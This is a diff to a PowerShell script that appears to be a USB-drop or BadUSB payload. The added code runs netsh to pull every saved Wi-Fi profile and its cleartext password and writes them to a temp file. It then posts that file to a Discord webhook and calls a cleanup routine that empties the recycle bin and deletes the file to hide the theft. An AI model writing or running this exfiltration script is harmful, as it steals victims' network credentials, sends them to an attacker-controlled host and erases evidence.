@@ -1,8 +1,11 @@
-$test 
+############################################################################################################################################################
 
-$test > $env:TEMP/output.txt
+$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
 
-##########
+
+$wifiProfiles > $env:TEMP/--output.txt
+
+############################################################################################################################################################
 
 function Upload-Discord {
 
@@ -27,9 +30,11 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
 
-if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:TEMP/--wifi-pass.txt"}
+if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:TEMP/--output.txt"}
 
-############
+ 
+
+############################################################################################################################################################
 
 function Clean-Exfil { 
 
@@ -47,8 +52,9 @@ Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
 }
 
-#############
+############################################################################################################################################################
+
 if (-not ([string]::IsNullOrEmpty($ce))){Clean-Exfil}
 
 
-RI $env:TEMP/output.txt
+RI $env:TEMP/--output.txt
